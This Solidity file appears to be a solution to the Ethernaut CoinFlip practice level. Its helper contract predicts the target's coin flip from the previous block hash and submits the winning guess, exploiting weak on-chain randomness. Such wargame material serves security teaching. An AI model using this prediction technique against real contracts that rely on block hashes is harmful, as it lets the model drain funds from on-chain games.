// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipHelper {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlip;

  constructor(address _addr) public {
    consecutiveWins = 0;
    coinFlip = CoinFlip(_addr);
  }

  function guess() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 icoinFlip = blockValue.div(FACTOR);
    bool side = icoinFlip == 1 ? true : false;

    coinFlip.flip(side);
  }
}